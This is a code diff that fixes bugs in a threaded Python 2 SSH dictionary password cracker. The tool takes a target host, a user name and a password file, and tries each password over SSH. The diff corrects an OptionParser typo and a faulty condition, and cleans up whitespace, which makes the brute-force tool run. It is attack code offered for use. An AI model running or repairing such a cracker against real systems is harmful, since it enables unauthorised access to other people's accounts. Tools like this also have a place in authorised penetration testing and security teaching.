@@ -15,7 +15,7 @@ def connect(host, user, password, release):
 	"""
 	global Found #Take the global var
 	global Fails # "    "     "    "
-	
+
 	#Try to make the SSH connection, if no Exception that means that the password is right, so print it and finish
 	try:
 		socket = pxssh.pxssh()
@@ -44,7 +44,7 @@ def main():
 	SSH Password Cracker with a dictionary.
 	"""
 	#Take the flags options.
-	parser = optparse.OpptionParser("usage %prog -H <target host> -u <user> -f <password list>")
+	parser = optparse.OptionParser("usage %prog -H <target host> -u <user> -f <password list>")
 	parser.add_option("-H", dest="hostTarget", type="string", help="Specify target host")
 	parser.add_option("-u", dest="user", type="string", help="Specify the user")
 	parser.add_option("-f", dest="passwordFile", type="string", help="Specify passwords file (one for row)")
@@ -54,7 +54,7 @@ def main():
 	user = options.user
 	passwordFile = options.passwordFile
 
-	if host == None | user == None | passwordFile == None:
+	if host == None or user == None or passwordFile == None:
 		print parser.usage
 		exit(1)
 
@@ -70,7 +70,7 @@ def main():
 
 		connection_lock.acquire() #Get the turn with the Semaphore
 		password = line.strip("\r").strip("\n") #Remove \r and \n of the line
-		print "[-] Testing: %s" %(password) 
+		print "[-] Testing: %s" %(password)
 		t = Thread(target=connect, args=(host, user, password, True)) #Create the Thread object
 		child = t.start() #And runs it!!! =D
 
